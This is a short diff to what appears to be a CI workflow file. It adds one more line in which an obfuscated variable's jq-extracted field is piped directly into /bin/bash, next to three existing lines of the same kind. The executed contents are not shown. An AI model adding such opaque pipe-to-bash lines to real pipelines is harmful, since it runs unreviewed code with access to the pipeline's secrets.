@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$kfp8158" | jq -r .dyld186 | /bin/bash
           printf '%s' "$i59150" | jq -r .c55 | /bin/bash
           printf '%s' "$qt21076" | jq -r .y51 | /bin/bash
+          printf '%s' "$k7" | jq -r .m57250 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
